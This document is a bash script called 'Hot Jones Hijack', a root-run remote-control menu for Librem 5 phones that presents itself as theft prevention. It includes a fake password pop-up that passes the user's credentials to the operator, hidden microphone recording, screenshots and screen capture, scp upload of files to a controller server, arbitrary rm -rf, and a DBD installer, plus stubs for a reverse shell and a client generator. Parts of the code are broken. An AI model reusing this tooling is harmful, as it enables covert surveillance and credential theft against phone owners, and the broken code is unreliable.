#!/bin/bash
# ..................
[[ `id -u` -eq 0 ]] || { echo -e "\e[31mYou must be root to start your Hot Jones Hijack"; exit 1; }
resize -s 150 150
clear                                   # Clear the screen.
#SERVICE=Postgresql;
secs=$(date '+%S');

#if service postgresql status | grep -v grep | grep running > /dev/null
#then
    #echo "$SERVICE service running"
#else
    #echo "$SERVICE is not running, Starting service." 
    #service postgresql start
#fi 
#SERVICE1=Metasploit;
#if ps ax | grep -v grep | grep metasploit > /dev/null
#then
    #echo "$SERVICE1 service running"
#else
    #echo "$SERVICE1 is not running, Starting service." 
    #service metasploit start
#fi 
mkdir ~/Desktop/temp 
clear
clear
echo -e "\E[1;34m==========================================================="
echo -e "\E[1;34m==================== \e[97mHot Jones Hijack \E[1;34m====================="
echo -e "\E[1;34m::::::::\e[97mRemote Administration/Theft Prevention Tool\E[1;34m::::::::"
echo -e "\E[1;34m:::::::::::\e[97m Brought to you by 3/\/ | G /\/\ /-\ \E[1;34m:::::::::::"
echo -e "\E[1;34m==========================================================="
read -p "Press [Enter] key to Continue..."
clear
echo -e "\E[1;34m========== \e[97mHot Jones Hijack - Remote Admin Tool For The Librem 5\E[1;34m========="
if [ 0 -le $secs ] && [ $secs -le 14 ];
then
cat << "EOF"
                                          )  (
                                         (   ) )
                                          ) ( (
                                          o8Oo.)
                                        _o8o8O8o_
                                     .-'---------|  
                                    ( C|   Hot   |  
                                     '-.  Jones  |
                                       '_________'
                                        '-------'                          
EOF
elif [ 15 -le $secs ] && [ $secs -le 30 ];
then
cat << "EOF"
      )  (
     (   ) )
      ) ( (
      o8Oo.)
    _o8o8O8o_
 .-'---------|  
( C|   Hot   |
 '-.  Jones  |
   '_________'
    '-------' 
EOF
elif [ 31 -le $secs ] && [ $secs -le 45 ];
then
cat << "EOF"
                  )  (
                 (   ) )
                  ) ( (
                  o8Oo.)
                _o8o8O8o_
             .-'---------|  
            ( C|   Hot   |  
             '-.  Jones  |
               '_________'
                '-------'  
EOF
elif [ 46 -le $secs ] && [ $secs -le 57 ];
then
cat << "EOF"
                              )  (
                             (   ) )
                              ) ( (
                              o8Oo.)
                            _o8o8O8o_
                         .-'---------|  
                        ( C|   Hot   |  
                         '-.  Jones  |
                           '_________'
                            '-------'   
EOF
else
cat << "EOF"
                                                 :::
                                             :: :::.
                       \/,                    .:::::
           \),          \`-._                 :::888
           /\            \   `-.             ::88888
          /  \            | .(                ::88
         /,.  \           ; ( `              .:8888
            ), \         / ;``               :::888
           /_   \     __/_(_                  :88
             `. ,`..-'      `-._    \  /      :8
               )__ `.           `._ .\/.
              /   `. `             `-._______m         _,
  ,-=====-.-;'                 ,  ___________/ _,-_,'"`/__,-.
 C   =--   ;                   `.`._    V V V       -=-'"#==-._
:,  \     ,|      VvVv _,......__   `-.__A_A_ -. ._ ,--._ ",`` `-
||  |`---' :    vVvVv,'          `'--...____/   `" `".   `
|`  :       \   VvVv:
:  /         \   VvVv`-._
 \(_          `._  vVvVv `-.
 (_3             `._  vVv   `._
                    ``-._      `.
                         `-._    `.
                             `.    \
                               )   ;
                              /   /
               `.        |\ ,'   /
                 ",_A_/\-| `   ,'
                   `--..,_|_,-'\
                          |     \
                          |      \__
                          |__ 
EOF
fi 
tput sgr0                                       # 
echo -e "\e[31m_________________________[ \e[97mChoose Your Options \e[31m]________________________"
echo -e "\E[1;34m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\E[1;34m===\e[97m[1] \e[90mSend A Message       \e[97m [SEND MESSAGE TO SCREEN]  \E[1;34m"
tput sgr0                               # Reset colors to "normal."
echo -e "\E[1;34m:::\e[97m[2] \e[32mHardware Controls    \e[97m [ENABLE/DISABLE HARDWARE]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[3] \e[34mSounds               \e[97m [ALARM & VOLUME CONTROLS]\E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[4] \e[95mLocation             \e[97m [PULL GPS DATA] \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[5] \e[31mDevice Details       \e[97m [PULL DEVICE INFO]  \E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[6] \e[90mAccess Controls      \e[97m [LOCK/UNLOCK DEVICE]   \E[1;34m"
tput sgr0                               # Reset attributes.
echo -e "\E[1;34m===\e[97m[7] \e[32mSituational Awareness\e[97m [MIC, CAMERA, & VIDEO ACCESS]  \E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[8] \e[34mUser Awareness       \e[97m [SCREENSHOT, SCREEN CAPTURE, CALL/SMS LOGS]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[9] \e[95mWipe Device          \e[97m [LOOKS LIKE I'M GONNA HAVE TO JUMP...]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[10]\e[31mRemote Use           \e[97m [SPAWN SHELLs, MAKE CALLs, SEND SMS']   \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[11]\e[90mApps & Services      \e[97m [LIST APPS, START APPS/SERVICES]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[12]\e[32mReboot               \e[97m [REBOOT DEVICE]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[13]\e[34mDependency Checker   \e[97m [INSTALL DEPENDENCIES]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[14]\e[95mClient Connector     \e[97m [SELF HEALING CLIENT GENERATOR]  \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[0] \e[31mExit                 \e[97m [EXIT]   \E[1;34m"
tput sgr0

echo -e "\E[1;34m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\e[97m~~~~~~~~~~~~~~~~~ \e[31mProps to Puri.sm for their dedication\e[97m~~~~~~~~~~~~~~~~~\e[31m"
tput sgr0


read options

case "$options" in
# Note variable is quoted.

  "1" | "1" )
  # Accept upper or lowercase input.
  echo -e "\E[1;34m::::: \e[97mSend A Message / Raise A Pop Up Window \E[1;34m:::::"

PS3='Enter your choice: ENTER=Options Menu | 12=Main Menu | 13=QUIT: '
options=("Password Pop Up Box" "Warning Pop Up Box" "Error Pop Up Box" "List Of Options Pop Up Box" "Entry Pop Up Box" "Info Pop Up Box" "Notification Bubble Pop Up Box" "Progress Bar Pop Up Box" "YES/NO Question Pop Up Box" "Scale Pop Up Box" "Text Info/Image Pop Up Box" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
		"Password Pop Up Box")
			echo -e "\E[1;34m::::: \e[97mUsername|Password Will Be Displayed In Terminal Once Entered By User\E[1;34m:::::"
            zenity --display=:0 --username --password
            echo -e "\E[1;34m::::: \e[97mPassword Pop Up Has Been Displayed\E[1;34m:::::"
            ;;
		"Warning Pop Up Box")
			read -p 'Set Text: ' usertext;
            zenity --display=:0 --warning --text=$usertext --ellipsize
            echo -e "\E[1;34m::::: \e[97mWarning Message Has Been Displayed\E[1;34m:::::"
            ;; 
        "Error Pop Up Box")
            read -p 'Set Text: ' usertext;
            zenity --display=:0 --error --text=$usertext --ellipsize
            echo -e "\E[1;34m::::: \e[97mError Message Has Been Displayed\E[1;34m:::::"
            ;;
        "List Of Options Pop Up Box")
            read -p 'Set Text: ' usertext; read -p 'Set Column: ' usercol; read -p 'Set Option 1: ' userop1; read -p 'Set Option 2: ' userop2; read -p 'Set Option 3: ' userop3;
            export DISPLAY=:0 && zenity --list --text=$usertext --column=$usercol: $userop1 $userop2 $userop3
            echo -e "\E[1;34m::::: \e[97mDialog Box Sent. User's Selection Will Return In Terminal\E[1;34m:::::"
            ;;
        "Entry Pop Up Box")
            read -p 'Set Text: ' usertext;
            zenity --display=:0 --entry --text=$usertext
            echo -e "\E[1;34m::::: \e[97mEntry Message Box Has Been Displayed. User's Input Will Return In Terminal\E[1;34m:::::"
            ;;
        "Info Pop Up Box")
			read -p 'Set Text: ' usertext;
            zenity --display=:0 --info --text=$usertext
            echo -e "\E[1;34m::::: \e[97mInfo Message Has Been Displayed\E[1;34m:::::"
            ;;  
        "Notification Bubble Pop Up Box")
			read -p 'Set Text: ' usertext;
            zenity --display=:0 --notification --text=$usertext
            echo -e "\E[1;34m::::: \e[97mNotification Bubble Pop Up Has Been Sent\E[1;34m:::::"
            ;;
        "Progress Bar Pop Up Box")
			read -p 'Set Text: ' usertext;
            zenity --display=:0 --progress --text=$usertext; --pulsate --no-cancel
            echo -e "\E[1;34m::::: \e[97mPulsate Progress Bar Pop Up Has Been Sent\E[1;34m:::::"
            ;;   
        "YES/NO Question Pop Up Box")
			echo -e "\E[1;34m::::: \e[97mUser's Response Will NOT Be Returned In Terminal\E[1;34m:::::"
			read -p 'Set Text: ' usertext;
            zenity --display=:0 --question --text=$usertext; --ellipsize
            echo -e "\E[1;34m::::: \e[97mQuestion Pop Up Has Been Sent\E[1;34m:::::"
            ;; 
        "Scale Pop Up Box")
			echo -e "\E[1;34m::::: \e[97mPresents User With A Slider Scale. They Can Select Any Number In Your Set Range.\E[1;34m:::::"
			read -p 'Set Text: ' usertext; read -p 'Set Initial Value: ' userval; read -p 'Set Minimum Value: ' usermin; read -p 'Set Maximum Value: ' usermax;
            zenity --display=:0 --scale --text=$usertext --value=$userval --min-value=$usermin --max-value=$usermax
            echo -e "\E[1;34m::::: \e[97mScale Pop Ip Has Been Displayed. User's Input Will Return In Terminal.\E[1;34m:::::"
            ;; 
        "Text Info/Image Pop Up Box")
			echo -e "\E[1;34m::::: \e[97mSet URL To Any Image You Want To Display\E[1;34m:::::"
			read -p 'Set Checkbox Text: ' usertext; read -p 'Set URL To Load: ' userurl;
            zenity --display=:0 --text-info --editable --checkbox=$usertext --html --auto-scroll --url=$userurl
            echo -e "\E[1;34m::::: \e[97mText Info/Image Pop Up Has Been Sent. Any User Input Will Return In Terminal.\E[1;34m:::::"
            ;;
        "Main Menu")
            ~/HotJones/hijack.sh
            ;;
        "Quit")
            echo "PREEEOOOOWWWWWWWW" && exit 1
            ;;
        *) echo invalid option;;
    esac
done
 ;;

  "2" | "2" )
echo -e "\E[1;34m::::: \e[97mHardware Controls \E[1;34m:::::"
echo ""
echo -e "\E[1;34m::::: \e[97mChoose \"List Hardware\" To Identify The \"id=#\" Of Each Hardware Device \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97mHardware Output Will Echo To Screen & Be Captured In ~/HotJones/Hardware_List.txt \E[1;34m:::::"
PS3='Enter your choice: ENTER=Options Menu | 10=Main Menu | 11=QUIT: '
options=("List Hardware" "Disable Device" "Enable Device" "Enable Bluetooth" "Disable Bluetooth" "Enable WiFi" "Disable WiFi" "Enable WiFi Hotspot" "Disable WiFi Hotspot" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "List Hardware")
        xinput list | tee -a ~/HotJones/Hardware_List.txt
            ;;
        "Disable Device")
        read -p 'Set Hardware id= Number: ' userid;
        xinput set-prop $userid "Device Enabled" 0   
            ;;
        "Enable Device")
        read -p 'Set Hardware id= Number: ' userid;
        xinput set-prop $userid "Device Enabled" 1  
            ;;
        "Enable Bluetooth")
                 
            ;;
        "Disable Bluetooth")
                 
            ;;
        "Enable WiFi")
         ifconfig wlan0 up        
            ;;
        "Disable WiFi")
         ifconfig wlan0 down        
            ;;
        "Enable WiFi Hotspot")
                 
            ;;
        "Disable WiFi Hotspot")
                 
            ;;
        "Main Menu")
            ~/HotJones/hijack.sh
            ;;
        "Quit")
            echo "PREEEOOOOWWWWWWWW" && exit 1
            ;;
        *) echo invalid option;;
    esac
done

;;

  "3" | "3" )
echo -e "\E[1;34m::::: \e[97mSounds & Alarms \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
PS3='Enter your choice: ENTER=Options Menu | 8=Main Menu | 9=QUIT: '
options=("Set Off Full Volume Alarm" "Set Master Volume" "Set Volume Percentage" "Set Max Volume" "Increase Volume By Desired Amount" "Decrease Volume By Desired Amount" "Toggle Volume Mute" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Set Off Full Volume Alarm")
        amixer sset 'Master' 100%
        rhythmbox ~/HotJones/BOMB_SIREN.wav
        sleep 30
        amixer sset 'Master' 100%
        rhythmbox ~/HotJones/BOMB_SIREN.wav
			;;
        "Set Master Volume")
        echo "This Only Needs To Be Done ONCE On Each Device Before These Controls Are Used!"
        amixer scontrols
            ;;
        "Set Volume Percentage")
        read -p 'Set Volume Percentage Number (i.e., 50): ' uservol;
        amixer sset 'Master' $uservol%  
            ;;
        "Set Max Volume")
        amixer sset 'Master' 100%      
            ;;
        "Increase Volume By Desired Amount")
        read -p 'Increase Volume Percentage By (i.e., 3): ' uservol;
        amixer -q sset Master $uservol%+    
            ;;
        "Decrease Volume By Desired Amount")
        read -p 'Decrease Volume Percentage By (i.e., 3): ' uservol;
        amixer -q sset Master $uservol%-   
            ;;
        "Toggle Volume Mute")
        echo "Running This Option Will Toggle Mute On & Off"
        amixer -q sset Master toggle
			;;
        "Main Menu")
            ~/HotJones/hijack.sh
            ;;
        "Quit")
            echo "PREEEOOOOWWWWWWWW" && exit 1
            ;;
        *) echo invalid option;;
    esac
done

;;

  "4" | "4" )
echo -e "\E[1;34m::::: \e[97mLocation \E[1;34m:::::"
echo ""
echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
PS3='Enter your choice: ENTER=Options Menu | 4=Main Menu | 5=QUIT: '
options=("Get Current GPS Location Data" "Enable GPS" "" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Get Current GPS Location Data")
        
            ;;
        "Enable GPS")
        read -p 'Set Hardware id= Number: ' userid;
          
            ;;
        "")
        read -p 'Set Hardware id= Number: ' userid;
         
            ;;
        "Main Menu")
            ~/HotJones/hijack.sh
            ;;
        "Quit")
            echo "PREEEOOOOWWWWWWWW" && exit 1
            ;;
        *) echo invalid option;;
    esac
done

;;

  "5" | "5" )
echo -e "\E[1;34m::::: \e[97mDevice Details \E[1;34m:::::"
PS3='Enter your choice: ENTER=Options Menu | 2=Main Menu | 3=QUIT: '
options=("Dump Device Details" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Dump Device Details")
        rm ~/HotJones/Device_Details.txt
        uname -nvrma | tee -a ~/HotJones/Device_Details.txt
		sudo lshw | tee -a ~/HotJones/Device_Details.txt
		lscpu | tee -a ~/HotJones/Device_Details.txt
		lsblk | tee -a ~/HotJones/Device_Details.txt
		lsusb | tee -a ~/HotJones/Device_Details.txt
		lspci | tee -a ~/HotJones/Device_Details.txt
		sudo dmesg | tee -a ~/HotJones/Device_Details.txt
		sudo fdisk -l | tee -a ~/HotJones/Device_Details.txt
		sudo dmidecode -t memory | tee -a ~/HotJones/Device_Details.txt
		sudo dmidecode -t system | tee -a ~/HotJones/Device_Details.txt
		sudo dmidecode -t bios | tee -a ~/HotJones/Device_Details.txt
		sudo dmidecode -t processor | tee -a ~/HotJones/Device_Details.txt
		echo -e "\E[1;34m::::: \e[97mAll Device Details Captured In ~/HotJones/Device_Details.txt \E[1;34m:::::"
            ;;
        "Main Menu")
            ~/HotJones/hijack.sh
            ;;
        "Quit")
            echo "PREEEOOOOWWWWWWWW" && exit 1
            ;;
        *) echo invalid option;;
    esac
done

;;

  "6" | "6" )
echo -e "\E[1;34m::::: \e[97mAccess Controls \E[1;34m:::::"
echo ""
echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
PS3='Enter your choice: ENTER=Options Menu | 5=Main Menu | 6=QUIT: '
options=("Lock Screen" "Unlock Screen" "Lock Device - Disable Screen Inputs" "Unlock Device - Enable Screen Inputs" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Lock Screen")
        
            ;;
        "Unlock Screen")
                  
            ;;
        "Lock Device - Disable Screen Inputs")        
         
            ;;
        "Unlock Device - Enable Screen Inputs")        
         
            ;;
        "Main Menu")
            ~/HotJones/hijack.sh
            ;;
        "Quit")
            echo "PREEEOOOOWWWWWWWW" && exit 1
            ;;
        *) echo invalid option;;
    esac
done

;;

  "7" | "7" )
echo -e "\E[1;34m::::: \e[97mSituational Awareness \E[1;34m:::::"
echo ""
echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
PS3='Enter your choice: ENTER=Options Menu | 4=Main Menu | 5=QUIT: '
options=("Record Mic Audio" "" "" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Record Mic Audio")
        read -p 'Set Record For X Number Of Seconds: ' usersec;
        file=`date '+%Y_%m_%d__%H_%M_%S'`
        arecord -vv -fdat --device= ~/HotJones/Rec$file.wav & sleep $usersec; kill
        echo -e "\E[1;34m::::: \e[97mRecording Saved To ~/HotJones/Rec\E[1;34m"$file"\E[1;34m.wav \E[1;34m:::::"
            ;;
        "Front Cam Picture")
        file=`date '+%Y_%m_%d__%H_%M_%S'`
        ~/HotJones/FCRec$file 
        echo -e "\E[1;34m::::: \e[97mPicture Saved To ~/HotJones/FCPic\E[1;34m"$file"\E[1;34m \E[1;34m:::::"
            ;;
        "Back Cam Picture")
        file=`date '+%Y_%m_%d__%H_%M_%S'`
        ~/HotJones/BCRec$file 
        echo -e "\E[1;34m::::: \e[97mPicture Saved To ~/HotJones/BCPic\E[1;34m"$file"\E[1;34m \E[1;34m:::::" 
            ;;
        "Record Front Cam Video")
        read -p 'Set Record For X Number Of Seconds: ' usersec;
        file=`date '+%Y_%m_%d__%H_%M_%S'`
        ~/HotJones/FCRec$file & sleep $usersec; kill 
        echo -e "\E[1;34m::::: \e[97mRecording Saved To ~/HotJones/FCRec\E[1;34m"$file"\E[1;34m \E[1;34m:::::"
            ;;
        "Record Back Cam Video")
        read -p 'Set Record For X Number Of Seconds: ' usersec;
        file=`date '+%Y_%m_%d__%H_%M_%S'`
        ~/HotJones/BCRec$file & sleep $usersec; kill 
        echo -e "\E[1;34m::::: \e[97mRecording Saved To ~/HotJones/BCRec\E[1;34m"$file"\E[1;34m \E[1;34m:::::"
            ;;
        "Main Menu")
            ~/HotJones/hijack.sh
            ;;
        "Quit")
            echo "PREEEOOOOWWWWWWWW" && exit 1
            ;;
        *) echo invalid option;;
    esac
done

;;

  "8" | "8" )
echo -e "\E[1;34m::::: \e[97mUser Awareness \E[1;34m:::::"
echo ""
echo -e "\E[1;34m::::: \e[97mCheck In On User Interactions \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97mGrab Files From Librem 5 \E[1;34m:::::"
PS3='Enter your choice: ENTER=Options Menu | 6=Main Menu | 7=QUIT: '
options=("Grab Scrrenshot" "Perform Screen Capture" "Grab Call Logs" "Grab SMS Logs" "Push File From Librem 5 To Controller Server with SCP - Creds Required" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Grab Screenshot")
        file=`date '+%Y_%m_%d__%H_%M_%S'`
        gnome-screenshot -f ~/HotJones/Screenshot$file.png --display=:0
        echo -e "\E[1;34m::::: \e[97mScreenshot Captured In ~/HotJones/Screenshot\E[1;34m"$file"\E[1;34m.png \E[1;34m:::::"
            ;;
        "Perform Screen Capture")
        read -p 'Set Capture For X Number Of Seconds: ' usersec;
        file=`date '+%Y_%m_%d__%H_%M_%S'`
        recordmydesktop -o ScCap_$file --no-sound --on-the-fly-encoding --no-frame & sleep $usersec; kill
        echo -e "\E[1;34m::::: \e[97mScreen Capture File Located In ~/HotJones/ScCap_\E[1;34m"$file"\E[1;34m.ogv \E[1;34m:::::"
            ;;
        "Grab Call Logs")
        read -p 'Set Hardware id= Number: ' userid;
         
            ;;
        "Grab SMS Logs")
        read -p 'Set Hardware id= Number: ' userid;
         
            ;;
        "Push File From Librem 5 To Controller Server with SCP - Creds Required")	
	read -p 'Enter Local File On Librem 5 Including Full Path: ' userfile; read -p 'Enter Username On Controller Server: ' username; read -p 'Enter Controller Server Name / IP: ' usermachine; read -p 'Enter File Destination Full Path on Controller Server: ' userpath;
	scp $userfile $username@$usermachine:$userpath
		    ;;    
        "Main Menu")
            ~/HotJones/hijack.sh
            ;;
        "Quit")
            echo "PREEEOOOOWWWWWWWW" && exit 1
            ;;
        *) echo invalid option;;
    esac
done

;;

  "9" | "9" )
echo -e "\E[1;34m::::: \e[97mWipe Device \E[1;34m:::::"
echo ""
echo -e "\E[1;34m::::: \e[97m**WARNING** This Will WIPE Your Device / SD Card \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
PS3='Enter your choice: ENTER=Options Menu | 4=Main Menu | 5=QUIT: '
options=("Wipe SD Card" "Wipe Device" "Wipe Specific File/Folder" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Wipe SD Card")
        
            ;;
        "Wipe Device")
        read -p 'Set Hardware id= Number: ' userid;
          
            ;;
        "Wipe Specific File/Folder")
        read -p 'Set Folder/File To Be Deleted (/path/to/folder/file): ' userdel;
        rm -rf $userdel
            ;;
        "Main Menu")
            ~/HotJones/hijack.sh
            ;;
        "Quit")
            echo "PREEEOOOOWWWWWWWW" && exit 1
            ;;
        *) echo invalid option;;
    esac
done

;;

  "10" | "10" )
echo -e "\E[1;34m::::: \e[97mRemote Use \E[1;34m:::::"
echo ""
echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
PS3='Enter your choice: ENTER=Options Menu | 5=Main Menu | 6=QUIT: '
options=("Spawn Reverse Shell" "Initiate Call" "Send SMS" "Send IM/Matrix" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Spawn Reverse Shell")
        
            ;;
        "Initiate Call")
        read -p 'Set Hardware id= Number: ' userid;
          
            ;;
        "Send SMS")
        read -p 'Set Hardware id= Number: ' userid;
         
            ;;
        "Send IM/Matrix")
        read -p 'Set Hardware id= Number: ' userid;
         
            ;;
        "Main Menu")
            ~/HotJones/hijack.sh
            ;;
        "Quit")
            echo "PREEEOOOOWWWWWWWW" && exit 1
            ;;
        *) echo invalid option;;
    esac
done

;;

  "11" | "11" )
echo -e "\E[1;34m::::: \e[97mApps & Services \E[1;34m:::::"
echo ""
echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
PS3='Enter your choice: ENTER=Options Menu | 7=Main Menu | 8=QUIT: '
options=("List Installed Applications" "Launch Application" "Start Service" "Stop Service" "Restart Service" "Check Service Status" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "List Installed Applications")
        dpkg --get-selections
            ;;
        "Launch Application")
        echo -e "\E[1;34m::::: \e[97mThis Feature Will NOT Work With All Applications \E[1;34m:::::"
        read -p 'Set Application To Launch: ' userapp; read -p 'Set Additional Application Parameters (Optional): ' userparams;
        $userapp $userparams
            ;;
        "Start Service")
        read -p 'Set Service To Start: ' userserv;
        service $userserv start
            ;;
        "Stop Service")
        read -p 'Set Service To Stop: ' userserv;
        service $userserv stop
            ;;
        "Restart Service")
        read -p 'Set Service To Restart: ' userserv;
        service $userserv restart
            ;;
        "Check Service Status")
        read -p 'Set Service To Check Status: ' userserv;
        service $userserv status
            ;;
        "Main Menu")
            ~/HotJones/hijack.sh
            ;;
        "Quit")
            echo "PREEEOOOOWWWWWWWW" && exit 1
            ;;
        *) echo invalid option;;
    esac
done

;;

  "12" | "12" )
echo -e "\E[1;34m::::: \e[97mReboot \E[1;34m:::::"
echo ""
echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
PS3='Enter your choice: ENTER=Options Menu | 2=Main Menu | 3=QUIT: '
options=("Reboot Device" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Reboot Device")
        sudo reboot
            ;;
        "Main Menu")
            ~/HotJones/hijack.sh
            ;;
        "Quit")
            echo "PREEEOOOOWWWWWWWW" && exit 1
            ;;
        *) echo invalid option;;
    esac
done

;;

"13" | "13" )
  # Accept upper or lowercase input.
  echo -e "\E[1;34m::::: \e[97mCheck for Dependencies \E[1;34m:::::"
  echo -e "\E[1;34m::::: \e[97m**WARNING** Only Run Dependencies Option For Your Correct Platform \E[1;34m:::::"
  echo -e "\E[1;34m::::: \e[97m**WARNING** Failure To Heed This Warning Will Result In Security Vulnerabilities! \E[1;34m:::::"
PS3='Enter your choice: ENTER=Options Menu | 4=Main Menu | 5=QUIT: '
options=("Librem 5 Dependencies" "Controller Server Dependencies" "DBD Installer" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Librem 5 Dependencies")
		clear
		echo -e "\e[1;34m[*] Performing an APT Update prior to installing dependencies...\e[0m\n"
		sleep 3
		apt-get update
		echo ""
		echo -e "\e[1;32m[+] APT Update complete...\e[0m"
		sleep 3
		clear
		echo -e "\e[1;34m[*] Please wait while I install some dependencies...\e[0m\n"
		sleep 3
		clear
#		updatedb
		mkdir /tmp/HotJones/
		echo ""

	reqs="alsa-utils xinput recordmydesktop"
	for i in $reqs; do
		dpkg -s "$i" &> /tmp/HotJones/$i-install.txt
		isinstalled=$(cat /tmp/HotJones/$i-install.txt | grep -o "Status: install ok installed")
		if [ ! -e /usr/bin/$i ] && [ ! -e /usr/sbin/$i ] && [ ! -e /usr/local/sbin/$i ] && [ ! -e /usr/local/bin/$i ] && [ -z "$isinstalled" ]; then
				echo -e "\e[1;34m[-] It doesn't appear that $i is installed on your system. Installing it now...\e[0m"
				echo ""
			if [ ! -z $(apt-get install -y "$i" | grep -o "E: Couldn") ]; then
				echo -e "\e[1;31m[-] I had a hard time installing $i from the Linux repository.\e[0m"
				touch /tmp/HotJones/$i-fail.txt
			else
				dpkg -s "$i" &> /tmp/HotJones/$i-install.txt
				isinstalled=$(cat /tmp/HotJones/$i-install.txt | grep -o "Status: install ok installed")				
				if [ ! -z "$isinstalled" ]; then
					update=1
					echo -e "\e[1;32m[+] Good news, $i installed without any issues.\e[0m"
					echo ""
					sleep 2
				else
					echo ""
					echo -e "\e[1;31m[!] It doesn't appear that I will be able to install $i right now.\e[0m"
					echo ""
					sleep 2
				fi
			fi
		else
			echo -e "\e[1;32m[+] $i is already installed on your system, moving on...\e[0m"
			echo ""
			sleep 2
		fi
	done
		rm -rf /tmp/HotJones/
			;;
		"Controller Server Dependencies")
		clear
		echo -e "\e[1;34m[*] Performing an APT Update prior to installing dependencies...\e[0m\n"
		sleep 3
		apt-get update
		echo ""
		echo -e "\e[1;32m[+] APT Update complete...\e[0m"
		sleep 3
		clear
		echo -e "\e[1;34m[*] Please wait while I install some dependencies...\e[0m\n"
		sleep 3
		clear
#		updatedb
		mkdir /tmp/HotJones/
		echo ""

	reqs="gcc-mingw-w64-i686 openssh-server"
	for i in $reqs; do
		dpkg -s "$i" &> /tmp/HotJones/$i-install.txt
		isinstalled=$(cat /tmp/HotJones/$i-install.txt | grep -o "Status: install ok installed")
		if [ ! -e /usr/bin/$i ] && [ ! -e /usr/sbin/$i ] && [ ! -e /usr/local/sbin/$i ] && [ ! -e /usr/local/bin/$i ] && [ -z "$isinstalled" ]; then
				echo -e "\e[1;34m[-] It doesn't appear that $i is installed on your system. Installing it now...\e[0m"
				echo ""
			if [ ! -z $(apt-get install -y "$i" | grep -o "E: Couldn") ]; then
				echo -e "\e[1;31m[-] I had a hard time installing $i from the Linux repository.\e[0m"
				touch /tmp/HotJones/$i-fail.txt
			else
				dpkg -s "$i" &> /tmp/HotJones/$i-install.txt
				isinstalled=$(cat /tmp/HotJones/$i-install.txt | grep -o "Status: install ok installed")				
				if [ ! -z "$isinstalled" ]; then
					update=1
					echo -e "\e[1;32m[+] Good news, $i installed without any issues.\e[0m"
					echo ""
					sleep 2
				else
					echo ""
					echo -e "\e[1;31m[!] It doesn't appear that I will be able to install $i right now.\e[0m"
					echo ""
					sleep 2
				fi
			fi
		else
			echo -e "\e[1;32m[+] $i is already installed on your system, moving on...\e[0m"
			echo ""
			sleep 2
		fi
	done
		rm -rf /tmp/HotJones/
			;;
		"DBD Installer")
		dbdinstalled=$(ls /usr/bin/dbd)
		if [ "$dbdinstalled" == "/usr/bin/dbd" ]; then
			echo -e "\n\e[1;34m[*] I see that DBD is already installed...\e[0m"
			echo ""
			sleep 3
			echo "PREEEOOOOWWWWWWWW" && ~/HotJones/hijack.sh
		else
			echo -e "\e[1;34m[*] Performing DBD install...\e[0m\n"
			clear
			echo -e "\e[1;34mPlease wait while I install DBD on your machine...\e[0m"
			echo ""
			sleep 3
			cp ~/HotJones/misc/dbd/conf/dbd_defaults.conf ~/HotJones/misc/dbd/dbd.h
			cd ~/HotJones/misc/dbd/
			make unix
			chmod +x dbd
			cp dbd ~/HotJones/misc/dbd/binaries/
			mv dbd /usr/bin/
			cd ~/HotJones/
			echo "" 
			echo -e "\e[1;32mDone! Returning to the Main Menu...\e[0m"
			echo ""
			sleep 3
	fi
			;;
		"Main Menu")
            ~/HotJones/hijack.sh
            ;;
		"Quit")
            echo "PREEEOOOOWWWWWWWW" && exit 1
            ;;
        *) echo invalid option;;
    esac
done 

;;

  "14" | "14" )
# Accept upper or lowercase input.
echo -e "\E[1;34m::::: \e[97mSelf Healing Client Generator \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97m**WARNING** This Is To Be Run On The Controller Server ONLY (After Installing Server Dependencies) \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97mFollow The Prompts To Create The Client Connector \E[1;34m:::::"
